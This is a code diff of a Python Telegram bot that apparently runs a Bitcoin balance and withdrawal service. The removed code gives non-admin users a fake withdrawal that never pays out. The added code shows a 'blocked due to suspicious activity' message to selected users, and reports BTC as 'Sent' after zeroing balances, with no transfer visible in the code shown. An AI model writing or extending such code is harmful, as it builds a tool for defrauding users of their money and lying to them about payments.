@@ -160,15 +160,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     elif cmd == "withdrawal":
-        if balance <= 0:
-            await query.edit_message_text("❌ You have no balance.", reply_markup=get_main_menu())
-        elif not is_admin(uid):
-            # Fake withdrawal for non-admins
-            await query.edit_message_text("Enter withdrawal address:", reply_markup=None)
-            pending_withdrawal[uid] = {"step": 1, "fake": True, "amount": balance}
-            log_action(uid, "Started Fake Withdrawal")
+        if withdraw_blocker.get(uid, False):
+            await query.edit_message_text("❌ Transaction blocked due to suspicious activity.", reply_markup=get_back_main_button())
+        elif balance <= 0:
+            await query.edit_message_text("❌ You have no balance.", reply_markup=get_back_main_button())
         else:
-            # Real withdrawal for admins
             await query.edit_message_text("Enter withdrawal address:", reply_markup=None)
             pending_withdrawal[uid] = {"step": 1, "amount": balance}
             log_action(uid, "Started Withdrawal")
@@ -177,17 +173,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _, addr, net, fee = cmd.split(":")
         net, fee = float(net), float(fee)
         set_balance(uid, 0.0)
-        pending_withdrawal.pop(uid, None)
+        data['users'][str(uid)]['profit'] = 0.0
         log_action(uid, "Withdrew BTC", {"net": net, "fee": fee, "address": addr})
-        await query.edit_message_text(
-            f"✅ Sent {net:.8f} BTC to `{addr}`\n(5% fee was applied)",
-            parse_mode="Markdown",
-            reply_markup=get_main_menu()
-        )
+        await query.edit_message_text(f"✅ Sent {net:.8f} BTC to `{addr}`\n(5% fee was applied)", parse_mode="Markdown", reply_markup=get_main_menu())
 
     elif cmd == "cancel_withdraw":
         pending_withdrawal.pop(uid, None)
-        await query.edit_message_text("❌ Withdrawal cancelled.", reply_markup=get_main_menu())
+        await query.edit_message_text("❌ Withdrawal cancelled.", reply_markup=get_back_main_button())
 
     elif cmd == "run":
         if balance <= 0:
@@ -302,33 +294,16 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # Withdrawal flow
-if uid in pending_withdrawal and pending_withdrawal[uid].get("step") == 1:
-    addr = msg.strip()
-    info = pending_withdrawal[uid]
-    bal = info["amount"]
-    
-    if info.get("fake"):
-        # Non-admin fake withdrawal
-        pending_withdrawal.pop(uid)
-        await update.message.reply_text(
-            f"✅ Withdrawal request received for `{addr}`.\n⚠️ Please note: Transfers may take up to a week to process.",
-            parse_mode="Markdown",
-            reply_markup=get_main_menu()
-        )
-        log_action(uid, "Requested Fake Withdrawal", {"address": addr, "amount": bal})
-    else:
-        # Real withdrawal for admin
+    if uid in pending_withdrawal and pending_withdrawal[uid].get("step") == 1:
+        addr = msg
+        bal = pending_withdrawal[uid]["amount"]
         fee = bal * 0.05
         net = bal - fee
-        pending_withdrawal.pop(uid)
-        set_balance(uid, 0.0)
+        pending_withdrawal.pop(uid, None)
         await update.message.reply_text(
-            f"✅ Sent {net:.8f} BTC to `{addr}`\n(5% fee was applied)",
-            parse_mode="Markdown",
-            reply_markup=get_main_menu()
+            f"Confirm sending {net:.8f} BTC (5% fee) to `{addr}`:", parse_mode="Markdown",
+            reply_markup=get_withdrawal_confirmation(uid, addr, net, fee)
         )
-        log_action(uid, "Withdrew BTC", {"net": net, "fee": fee, "address": addr})
-
         return
 
     # Edit flows
@@ -430,11 +405,3 @@ if __name__ == "__main__":
     nest_asyncio.apply()  # already in your code
     loop = asyncio.get_event_loop()
     loop.run_until_complete(start_bot())
-
-
-
-
-
-
-
-
